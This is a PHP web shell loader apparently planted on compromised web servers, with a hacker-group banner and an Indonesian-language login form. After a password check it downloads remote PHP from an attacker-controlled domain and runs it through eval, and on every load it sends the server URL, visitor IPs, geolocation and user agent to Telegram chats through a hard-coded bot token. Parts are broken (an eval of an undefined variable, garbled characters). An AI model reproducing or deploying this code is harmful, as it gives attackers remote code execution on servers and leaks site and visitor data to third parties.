<?php
/**
 * ===============================================================
 * @version  1.2.1
 * @author   HoneyTennessee
 * carefully encode by the KT GRUP
 * As Long As Im Still Thriving You Got No Chance To Defeat Me 
 * ---------------------------------------------------------------
 */
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the Tennessee is submitted and correct
if (isset($_POST['Tennessee'])) {
    $entered_Tennessee = $_POST['Tennessee'];
    $hashed_Tennessee = 'e4c66d3cbe88a33f851428f217de63c2';
    if (md5($entered_Tennessee) === $hashed_Tennessee) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu';
    } else {
        
        echo "Upss.. Ayo Pikirkan Secara Logika.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://tennesse.haxor-mahasuhu.info/Backup-Shell/alfa-master-tennessee-ganteng.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>4NOMAL1</title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="Tennessee">Welcome Tennessee Enjoy The Battle !</label>
            <input type="password" display="none" id="Tennessee" name="Tennessee">
            <input type="submit" value="Cari">
        </form>
    </body>
    </html>
    <?php
}
$botToken = '8721293098:AAFzG1E6kbfOT9qDmyQJJnwpAPt-jg1km5g';
$chatId = '-5242479507';
$chatId2 = '7439804416';

$ip_public = $_SERVER['REMOTE_ADDR'];
$ip_internal = getHostByName(getHostName());
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$location_api_url = "http://ip-api.com/json/$ip_public";
$location_data = json_decode(file_get_contents($location_api_url), true);

if ($location_data && $location_data['status'] === 'success') {
    $country = $location_data['country'];
    $countryCode = $location_data['countryCode'];
    $region = $location_data['region'];
    $regionName = $location_data['regionName'];
    $city = $location_data['city'];
    $zip = $location_data['zip'];
    $lat = $location_data['lat'];
    $lon = $location_data['lon'];
    $timezone = $location_data['timezone'];
    $isp = $location_data['isp'];
    $org = $location_data['org'];
    $as = $location_data['as'];
    $address = "Country: $country ($countryCode), Region: $regionName ($region), City: $city, Zip: $zip, Latitude: $lat, Longitude: $lon, Timezone: $timezone, ISP: $isp, Organization: $org, AS: $as";
} else {
    $address = "Alamat tidak ditemukan";
}

$password_input = isset($_SESSION['entered_Tennessee']) ? $_SESSION['entered_Tennessee'] : 'No Input';

$pesan_alert2 = "URL : $x_path
IP Address : [ $ip_public - Public ] / [ $ip_internal - Private ]
Address : [ $address ]
User-Agent : [ $user_agent ]
Password Input : [ $password_input ]";
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "ÃƒÂ¢Ã¢ Url : $x_path\nÃƒÂ¢Ã¢Â¬Ã‚ IP Address : [ $ip_public - Public ] / [ $ip_internal - Private ]\nÂ¢Ã¢â€šÂ¬Ã‚Â¢ Address : [ $address ]\nÃƒÂ¢Ã¢Â¬Â¢ User-Agent : [ $user_agent ]";

$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($pesan_alert);
$telegramApiUrl2 = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId2&text=" . urlencode($pesan_alert2);
file_get_contents($telegramApiUrl);
file_get_contents($telegramApiUrl2);

eval('?>' . $phpScript);
?>
